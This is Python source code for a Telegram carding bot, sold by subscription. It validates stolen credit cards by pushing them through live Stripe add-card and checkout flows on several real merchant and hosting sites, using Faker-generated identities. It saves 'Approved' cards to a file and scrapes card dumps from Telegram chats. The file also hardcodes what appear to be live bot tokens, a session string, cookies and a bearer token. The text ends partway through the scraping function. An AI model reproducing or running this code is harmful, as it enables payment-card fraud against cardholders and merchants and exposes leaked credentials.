# -*- coding: utf-8 -*-
import telebot
import os, time, random, json, threading, uuid, re, pickle, requests, base64, string, importlib, shutil
from datetime import datetime, timedelta
from telebot import types
from user_agent import generate_user_agent
from colorama import Fore, init as colorama_init
from faker import Faker
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import ImportChatInviteRequest
import asyncio
import importlib
import importlib.util
# ============================================================
# إعدادات البوت الأساسية
# ============================================================
TOKEN = '5976325556:AAHqPFomzlrhEudceDmXa2K8YgcB_GOQAlw'
ADMIN_ID = 1830612191
CHANNEL_ID = '-1001969800869' 
BOT_CREATOR = "𝑷𝒉𝒂𝒏𝒕𝒐𝒎"
BOT_USERNAME = "@UE4_so"
PROVIDER_TOKEN = ""

DATA_FILE = 'data.json'
CONFIG_FILE = 'config.json'
BANNED_FILE = 'banned.json'
PORTALS_CONFIG = 'portals.json'
PORTALS_DIR = 'portals/'
APPROVED_FILE = 'approved.txt'

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
colorama_init(autoreset=True)

stop_events = {}   
user_sessions = {}
user_temp_data = {}
notified_users = set()

# ============================================================
# دوال إدارة الملفات والبيانات
# ============================================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_config():
    default_config = {
        "force_subscription": False,
        "maintenance_mode": False,
        "prices": {"day": 15, "3days": 25, "week": 50, "month": 120},
        "welcome_image": "https://t.me/im_vegita/8",
        "support_link": "https://t.me/im_vegita",
        "ha_credentials": {"token": "", "use_dynamic": True},
        "custom_approved_keywords": ["3D Secure authentication"],
        "custom_declined_keywords": [],
        "channel_id": "",
        "telethon_session": "1ApWapzMAUCSk85dR7GC6ADLp5B_hKdhYugWCxaciCu9YbpcFjHJD1zRSfQ_tNe0YvY7Rl9jn5UF3DoJR8zbiSVhwwsHxMPngHg_Vg68g69-GknTBjAIzsI7BYB-mfN3E-T25B1CyNS8QRg-skSz-xuLV8Kbd3gEL97gB0bIMapV57z6G2W1D_vEJrqJJglUeXRdCLHFS5eFNTq-RoflJKFLZs7qaqfyq2rVNnVW-6uLEqoliOSLQ9o8B9SeV3FltZrLS2RDwa7kipXXsTAAbb5tS_xrCVGjgL_Ogb8ZdHAWbUJjqmyY-bVIDaVx6t7X3IHPAOjIarXj3-SM-6t2c0bf0rbfGhF8=",
        "disabled_portals": []
    }
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, indent=4)
        return default_config

    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            loaded = json.load(f)

        # دمج المفاتيح الناقصة
        updated = False
        for key, value in default_config.items():
            if key not in loaded:
                loaded[key] = value
                updated = True

        if updated:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(loaded, f, indent=4)

        return loaded
    except:
        return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4, ensure_ascii=False)

config = load_config()
CHANNEL_ID = config.get('channel_id', '')   # تحميل معرف القناة

banned_users = []
if os.path.exists(BANNED_FILE):
    try:
        with open(BANNED_FILE, 'r', encoding='utf-8') as f:
            banned_users = json.load(f)
    except:
        pass
else:
    with open(BANNED_FILE, 'w', encoding='utf-8') as f:
        json.dump(banned_users, f)

def load_banned():
    if os.path.exists(BANNED_FILE):
        try:
            with open(BANNED_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_banned(banned_list):
    with open(BANNED_FILE, 'w', encoding='utf-8') as f:
        json.dump(banned_list, f, indent=4)

def load_portals():
    if not os.path.exists(PORTALS_CONFIG):
        return {}
    try:
        with open(PORTALS_CONFIG, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_portals(portals):
    with open(PORTALS_CONFIG, 'w', encoding='utf-8') as f:
        json.dump(portals, f, indent=4)

def save_approved_card(card, gateway, result):
    line = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {gateway} | {card} | {result}\n"
    with open(APPROVED_FILE, 'a', encoding='utf-8') as f:
        f.write(line)

portal_modules = {}
portal_commands = {}

def load_all_portals():
    portals = load_portals()
    if not os.path.exists(PORTALS_DIR):
        os.makedirs(PORTALS_DIR)
    for name, info in portals.items():
        if not info.get('active', True):
            continue
        cmd = info['command']
        filepath = info['file']
        if os.path.exists(filepath):
            try:
                spec = importlib.util.spec_from_file_location(f"portal_{name}", filepath)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                if hasattr(mod, 'check'):
                    portal_modules[cmd] = mod
                    portal_commands[cmd] = name
                else:
                    print(f"البوابة {name} لا تحتوي على دالة check")
            except Exception as e:
                print(f"خطأ في تحميل {name}: {e}")

load_all_portals()

def is_approved_result(res):
    cfg = load_config()
    approved_kw = cfg.get('custom_approved_keywords', [])
    default_approved = ['Approved', 'Charge !', '3D Secure authentication']
    for kw in default_approved + approved_kw:
        if kw.lower() in res.lower():
            return True
    return False

def is_declined_result(res):
    cfg = load_config()
    declined_kw = cfg.get('custom_declined_keywords', [])
    default_declined = ['declined', 'Your card was declined.', 'do_not_honor']
    for kw in default_declined + declined_kw:
        if kw.lower() in res.lower():
            return True
    return False

# ============================================================
# كلاس Stripe الأصلي (AnalyticOrange)
# ============================================================
class defonali:
    def __init__(self, session_file='sesiii329.pkl'):
        self.Ali_file = session_file
        self.sessions = self.load_sessions()
        self.user = generate_user_agent()
        self._lock = threading.Lock()

    def load_sessions(self):
        if os.path.exists(self.Ali_file):
            with open(self.Ali_file, 'rb') as f:
                return pickle.load(f)
        return []

    def save_sessions(self):
        with open(self.Ali_file, 'wb') as f:
            pickle.dump(self.sessions, f)

    def genAco(self):
        rt = requests.Session()
        headers = {'user-agent': self.user}
        try:
            html = rt.get('https://analyticorange.com/my-account/', headers=headers, timeout=15).text
            addnonce = html.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
            rt.addnonce = addnonce
            return rt
        except:
            return None

    def get_avdila(self):
        while True:
            ties = time.time()
            random.shuffle(self.sessions)
            for Aco_data in self.sessions:
                last_used = Aco_data.get('last_used', 0)
                if ties - last_used > 35:
                    Aco_data['last_used'] = ties
                    self.save_sessions()
                    sess = Aco_data.get('session')
                    if sess is not None:
                        return sess
                    return Aco_data
            time.sleep(1)

    def regester(self):
        if len(self.sessions) < 50:
            Ali_Al_Astora = self.genAco()
            if Ali_Al_Astora is None:
                return None
            emali = "".join(random.choices('qwertyuioplkjhgfdsaxzcvbnm1234567890', k=12))
            headers = {
                'authority': 'analyticorange.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://analyticorange.com',
                'pragma': 'no-cache',
                'referer': 'https://analyticorange.com/my-account/',
                'user-agent': self.user,
            }
            data1 = {
                'email': emali + '@gmail.com',
                'wc_order_attribution_user_agent': self.user,
                'woocommerce-register-nonce': Ali_Al_Astora.addnonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register',
            }
            try:
                Ali_Al_Astora.post('https://analyticorange.com/my-account/add-payment-method/',
                                   headers=headers, data=data1, timeout=15)
                self.sessions.append({'session': Ali_Al_Astora, 'last_used': time.time()})
                self.save_sessions()
                return Ali_Al_Astora
            except:
                return None
        return self.get_avdila()

    def Payment(self, P):
        try:
            parts = P.strip().split('|')
            n = parts[0]
            mm = parts[1]
            yy = parts[2][-2:]
            cvc = parts[3].replace('\n', '')
        except:
            return 'Invalid Card Format'

        srt = self.regester()
        if srt is None:
            return "Account creation failed"

        headers = {
            'authority': 'analyticorange.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://analyticorange.com/my-account/payment-methods/',
            'user-agent': self.user,
        }

        try:
            html = srt.get('https://analyticorange.com/my-account/add-payment-method/', headers=headers, timeout=15).text
            addnoncee = html.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
            stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
            stripe_pk = stripe_pk_match.group()
        except:
            return 'Failed to fetch Stripe token'

        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'user-agent': self.user,
        }
        try:
            response = srt.post('https://m.stripe.com/6', headers=headers, timeout=15)
            muid = response.json()['muid']
            guid = response.json()['guid']
            sid = response.json()['sid']
        except:
            return 'Stripe fingerprint failed'

        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': self.user,
        }

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fc094bc56cb%3B+stripe-js-v3%2Fc094bc56cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fanalyticorange.com&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&guid={guid}&muid={muid}&sid={sid}&key={stripe_pk}&_stripe_version=2024-06-20'

        try:
            response = srt.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
            idi = response.json()['id']
        except:
            return response.json().get('error', {}).get('message', 'Stripe API error')

        headers = {
            'authority': 'analyticorange.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://analyticorange.com',
            'referer': 'https://analyticorange.com/my-account/add-payment-method/',
            'user-agent': self.user,
            'x-requested-with': 'XMLHttpRequest'
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idi,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnoncee,
        }

        try:
            response = srt.post('https://analyticorange.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=15)
            text = response.text.lower()
            if 'card was declined' in text or 'your card could not be set up' in text:
                return 'Your card was declined.'
            elif 'success' in text:
                return 'Approved'
            else:
                return response.json().get('data', {}).get('error', {}).get('message', 'Unknown response')
        except:
            return response.json().get('data', {}).get('error', {}).get('message', 'Unknown response')

def py_check(card):
    try:
        parts = card.strip().split('|')
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        if "20" in yy:
            yy = yy.split("20")[1]
    except:
        return "Invalid Card Format"

    fake = Faker('en_US')
    name = fake.name()
    address = fake.street_address()
    city = fake.city()
    post = fake.postalcode()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]={name}&billing_details[address][line1]={address}&billing_details[address][city]={city}&billing_details[address][postal_code]={post}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=f54f7af0-cc38-4b6e-9a48-9da238b5d964509755&sid=3fbc7331-5b75-4664-a7c9-7ffa3d9eb649304c76&payment_user_agent=stripe.js%2Fa1ef9c87ff%3B+stripe-js-v3%2Fa1ef9c87ff%3B+split-card-element&referrer=https%3A%2F%2Fwww.pythonanywhere.com&time_on_page=42345&client_attribution_metadata[client_session_id]=a8139dfe-c28b-4eb3-826b-736baaeb4889&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=38aadfa9-d9ff-4464-8169-b6ab5bc36055&key=pk_live_ECdoUHKMCDhZOSh2bJLLfBGa'

    try:
        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        if 'id' not in resp.json():
            return resp.json().get('error', {}).get('message', 'ERORR CARD')
        pid = resp.json()['id']
    except:
        return "Stripe Error"

    cookies = {
        'cookie_warning_seen': 'True',
        '_ga': 'GA1.1.818001322.1777370498',
        'csrftoken': 'pUMlH2bBYt8y6RjqXfzeDXJIkWrNt9S8Hp5KTP7a919QhCjmssl55q8HwaB9xRmt',
        'sessionid': '5rid9b4t2gd4w8hhaqdf0bi22sop8vay',
        '_ga_DHJF51F24N': 'GS2.1.s1777370498$o1$g1$t1777370938$j60$l0$h0',
        '__stripe_mid': 'f54f7af0-cc38-4b6e-9a48-9da238b5d964509755',
        '__stripe_sid': '3fbc7331-5b75-4664-a7c9-7ffa3d9eb649304c76',
    }

    headers2 = {
        'Accept': 'application/json',
        'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/phantoom1719/account/stripe_enter_card_data',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'X-CSRFToken': 'wNsC3kS84kgZ4upgCmTZYOKbz7RBXabpOiL1f7OHfShhffpc7zFQqh9aLl1X1SFK',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {'payment_method_id': pid}

    try:
        resp2 = requests.post(
            'https://www.pythonanywhere.com/user/phantoom1719/account/stripe_save_payment_details',
            cookies=cookies,
            headers=headers2,
            json=json_data,
            timeout=15
        )
        ms = resp2.json()['error']
        x = ['succeeded','success','nextPageURL','payment successfully add']
        if any(keyword in ms for keyword in x):
            return 'Approved'
        elif 'Your card has insufficient funds.' in ms:
            return 'Your card has insufficient funds.'
        else:
            return ms
    except:
        return "Unknown Error"
# ============================================================
# بوابة stripe charge 5$ (HostArmada)
# ============================================================
def ha_check(card):
    cfg = load_config()
    ha_cfg = cfg.get('ha_credentials', {})
    token_manual = ha_cfg.get('token', '')
    use_dynamic = ha_cfg.get('use_dynamic', True)
    FALLBACK_TOKEN = 'e633c0134cd6b5370bebddb3dada1e0b9018aac8'

    try:
        parts = card.strip().split('|')
        c = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        if "20" in yy:
            yy = yy.split("20")[1]
    except:
        return "Invalid Card Format"

    fake = Faker('en_US')
    name = fake.name()
    first_name = name.split()[0]
    last_name = name.split()[-1] if len(name.split()) > 1 else name
    email = first_name.lower() + str(random.randint(100,9999)) + "@gmail.com"
    address = fake.street_address()
    city = fake.city()
    postcode = fake.postalcode()
    phone = "088" + str(random.randint(1000000,9999999))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

    session = requests.Session()
    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
    session.headers.update({'user-agent': user_agent})

    csrf_token = None
    try:
        resp = session.get('https://my.hostarmada.com/cart.php?a=checkout&e=false', timeout=15)
        html = resp.text
        match = re.search(r'name="token" value="([a-f0-9]+)"', html)
        if match:
            csrf_token = match.group(1)
    except:
        pass

    if not csrf_token:
        if token_manual:
            csrf_token = token_manual
        else:
            csrf_token = FALLBACK_TOKEN

    if not csrf_token:
        return "Could not get CSRF token"

    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': user_agent,
    }
    stripe_data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={uuid.uuid4()}&muid={uuid.uuid4()}&sid={uuid.uuid4()}&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=144047&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'

    try:
        r_stripe = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
        if 'id' not in r_stripe.json():
            return r_stripe.json().get('error', {}).get('message', 'Stripe error')
        pm_id = r_stripe.json()['id']
    except:
        return "Stripe PM creation failed"

    order_headers = {
        'authority': 'my.hostarmada.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my.hostarmada.com',
        'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': user_agent,
    }

    payload = {
        'token': csrf_token,
        'submit': 'true',
        'custtype': 'new',
        'loginemail': '',
        'loginpassword': '',
        'firstname': first_name,
        'lastname': last_name,
        'email': email,
        'country-calling-code-phonenumber': ['1', ''],
        'phonenumber': phone,
        'companyname': '3480 ',
        'address1': address,
        'address2': '',
        'city': city,
        'state': 'New York',
        'postcode': postcode,
        'country': 'US',
        'contact': '',
        'domaincontactfirstname': '',
        'domaincontactlastname': '',
        'domaincontactemail': '',
        'country-calling-code-domaincontactphonenumber': '1',
        'domaincontactphonenumber': '',
        'domaincontactcompanyname': '',
        'domaincontactaddress1': '',
        'domaincontactaddress2': '',
        'domaincontactcity': '',
        'domaincontactstate': '',
        'domaincontactpostcode': '',
        'domaincontactcountry': 'US',
        'domaincontacttax_id': '',
        'password': password,
        'password2': password,
        'paymentmethod': 'stripe',
        'ccinfo': 'new',
        'ccdescription': '',
        'marketingoptin': '1',
        'accepttos': 'on',
        'payment_method_id': pm_id,
    }

    try:
        resp_order = session.post(
            'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
            headers=order_headers,
            data=payload,
            timeout=20
        )
        text = resp_order.text
        ms = resp_order.json().get('warning', '')
        x = ['succeeded','success','nextPageURL','payment successfully add','stripId']
        if any(keyword in ms for keyword in x) or 'stripId' in text:
            return "Approved"
        elif "Your card's security code is incorrect." in text:
            return "CNN"
        else:
            return ms
    except:
        return "Order submission error"

# ============================================================
# بوابة Convox (brn6) - stripe charge 1$
# ============================================================
def br_check(card):
    try:
        parts = card.strip().split('|')
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        if "20" in yy:
            yy = yy.split("20")[1]
    except:
        return "Invalid Card Format"

    user = generate_user_agent()
    r = requests.session()
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://js.stripe.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://js.stripe.com/',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    data1 = (
        f'guid=f4e7baea-8e05-47ad-9f67-77a4ee1e37c1f4597f'
        f'&muid=f00e51b4-c3a5-46d4-8375-8dba782cae0de87a3f'
        f'&sid=ae089eab-2300-4c81-9e57-cb02de24fdddf5e6a1'
        f'&referrer=https%3A%2F%2Fconsole.convox.com'
        f'&time_on_page=37498'
        f'&card[name]=phantoom+mod+'
        f'&card%5Baddress_line1%5D'
        f'&card%5Baddress_line2%5D'
        f'&card%5Baddress_city%5D'
        f'&card[address_state]=NY'
        f'&card[address_zip]=10080'
        f'&card[address_country]=US'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&payment_user_agent=stripe.js%2F3e83e515d5%3B+stripe-js-v3%2F3e83e515d5%3B+card-element'
        f'&client_attribution_metadata[client_session_id]=22d4033b-395a-4c32-bc0a-2582ead46c7a'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]=204bc0c2-a410-44d5-9d9e-03b567f035e0'
        f'&key=pk_live_XIEhdBvRpUaX9W2L7RtRVb7p'
        f'&_stripe_version=2025-03-31.basil'
    )

    try:
        resp1 = requests.post('https://api.stripe.com/v1/tokens', headers=headers1, data=data1, timeout=30)
        resp1_json = resp1.json()
    except:
        return 'Stripe Error'

    if 'id' not in resp1_json:
        return 'Token Not Found'

    token_id = resp1_json['id']

    cookies = {
        '__adroll_fpc': 'a39141b7f66e87a5b0056a9e8c6d7f97-1777818497774',
        '_gcl_gs': '2.1.k1$i1777818494$u223744649',
        '__ar_v4': '%7CMGKXKVIWXFHPDMQJ7ZI53J%3A20260502%3A1%7CBCN5I2BX4JG2XBI47EZFE7%3A20260502%3A1',
        'ajs_anonymous_id': '4c95635b-e105-43ef-bdc1-5ddbb9ac1ec7',
        '_gid': 'GA1.2.739151632.1777818521',
        '_gac_UA-64250188-1': '1.1777818521.CjwKCAjw5NvPBhAoEiwA_2egfnJePuVLVPOidZ7oRwYCUO_Ozf3xecBM1Yb9H2AE_GGMG6UgOH6WSRoCjokQAvD_BwE',
        '_gcl_au': '1.1.1174621755.1777818500.473835684.1777818524.1777818532',
        'ajs_user_id': '540b83f4-be89-4874-a8e9-a2837a0b649b',
        'ph_phc_HFRdL9kGpMtb3srFHOGMzBIHMFvDmqNH1MegfnU8IE8_posthog': '%7B%22%24device_id%22%3A%22019dee3d-712f-7767-8310-7417b9f0c7ff%22%2C%22distinct_id%22%3A%22019dee3d-712f-7767-8310-7417b9f0c7ff%22%2C%22%24sesid%22%3A%5B1777819062992%2C%22019dee3d-7269-7c74-9d50-d06bb1dd753b%22%2C1777818497542%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22u%22%3A%22https%3A%2F%2Fwww.convox.com%2Fmobile-backends%3Fgad_source%3D1%26gad_campaignid%3D23089403444%26gbraid%3D0AAAAA9p0v094UaE_zYYXk666PtSxIXPFb%26gclid%3DCjwKCAjw5NvPBhAoEiwA_2egfnJePuVLVPOidZ7oRwYCUO_Ozf3xecBM1Yb9H2AE_GGMG6UgOH6WSRoCjokQAvD_BwE%22%7D%2C%22%24user_state%22%3A%22anonymous%22%7D',
        '_gcl_aw': 'GCL.1777819063.CjwKCAjw5NvPBhAoEiwA_2egfnJePuVLVPOidZ7oRwYCUO_Ozf3xecBM1Yb9H2AE_GGMG6UgOH6WSRoCjokQAvD_BwE',
        '_ga': 'GA1.2.705112364.1777818497',
        '_ga_KQSNQKB3X0': 'GS2.1.s1777818496$o1$g1$t1777819213$j60$l0$h0',
        '__stripe_mid': 'f00e51b4-c3a5-46d4-8375-8dba782cae0de87a3f',
        '__stripe_sid': 'ae089eab-2300-4c81-9e57-cb02de24fdddf5e6a1',
    }
    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI1NDBiODNmNC1iZTg5LTQ4NzQtYThlOS1hMjgzN2EwYjY0OWIifQ.Dzc4VDXYM2U4Lxb7JzEA860W1mLqKaVGx5mE9ja_sUs',
        'baggage': 'sentry-environment=production,sentry-public_key=0f9236f765534f64b58ede09e45e0c4f,sentry-trace_id=59374ab595ab4ebabe0362f31df1d143,sentry-org_id=194862,sentry-transaction=organization%2Fbilling,sentry-sampled=true,sentry-sample_rand=0.13446837377400844,sentry-sample_rate=1',
        'sentry-trace': '59374ab595ab4ebabe0362f31df1d143-b3c68dee199db13d-1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://console.convox.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://console.convox.com/organizations/243d8ff9-90d2-420d-9de7-d35813f268c1/billing',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    json_data = {
        'operationName': 'BillingSaveCard',
        'variables': {
            'oid': '243d8ff9-90d2-420d-9de7-d35813f268c1',
            'token': token_id,
            'name': 'phantoom mod ',
            'country': 'US',
            'address': '',
            'zip_code': '10080',
            'street_address': '',
            'city': '',
            'state': 'NY',
        },
        'query': 'mutation BillingSaveCard($oid: ID!, $token: String!, $name: String!, $country: String!, $address: String!, $zip_code: String!, $street_address: String!, $city: String!, $state: String!) {\n  billing_save_card(\n    oid: $oid\n    token: $token\n    name: $name\n    country: $country\n    address: $address\n    zip_code: $zip_code\n    street_address: $street_address\n    city: $city\n    state: $state\n  )\n}',
    }

    try:
        resp2 = requests.post(
            'https://console.convox.com/graphql',
            cookies=cookies,
            headers=headers2,
            json=json_data,
            timeout=30
        )
        resp2_json = resp2.json()
    except:
        return 'GraphQL Error'

    errors = resp2_json.get('errors')
    if errors:
        data = json.loads(errors[0]['message'])
        ms = data['message']
        code = data['code']
        success_keywords = ['success', 'payment successfully add', 'succeeded']
        if any(keyword in code for keyword in success_keywords):
            return 'Approved'
        else:
            return f"{ms}"
#    return 'Unknown'

# ============================================================
# دوال مساعدة عامة
# ============================================================


# ============================================================
# دالة سكراب البطاقات باستخدام جلسة Telethon النصية
# ============================================================
async def scrape_cards_user(chat, limit):
    cfg = load_config()
    session_str = cfg.get('telethon_session', '')
    if not session_str:
        raise Exception("لم يتم تعيين جلسة Telethon النصية. استخدم /setsession")

    client = TelegramClient(StringSession(session_str), api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
    await client.start()

    try:
        try:
            entity = await client.get_entity(chat)
        except:
            if 'joinchat' in chat or '+' in chat:
                await client(ImportChatInviteRequest(chat.split('/')[-1]))
                entity = await client.get_entity(chat)
            else:
                raise

        messages = await client.get_messages(entity, limit=limit)

        cards = set()  # لتجنب التكرار
        # نمط مرن: يلتقط 15-16 رقم، يتبعها (بأي فاصل) شهر (01-12)، ثم سنة (2 أرقام أو 4)، ثم CVV (3-4 أرقام)
        pattern = re.compile(
            r'\b(\d{15,16})\b'                     # رقم البطاقة
            r'(?:\s*[/|:;,\s]\s*|\s+)'             # فاصل (مسافة، |, /, :, ;, ,)
            r'(0[1-9]|1[0-2])'                     # الشهر 01-12
            r'(?:\s*[/|:;,\s]\s*|\s+)'             # فاصل
            r'((?:20)?\d{2})'                      # السنة: 2025 أو 25
            r'(?:\s*[/|:;,\s]\s*|\s+)'             # فاصل
            r'(\d{3,4})\b'                         # CVV
        )

        for msg in messages:
            if msg.text:
                matches = pattern.findall(msg.text)
                for match in matches:
                    number, month, year, cvv = match
                    # توحيد السنة إلى رقمين
                    if len(year) == 4:
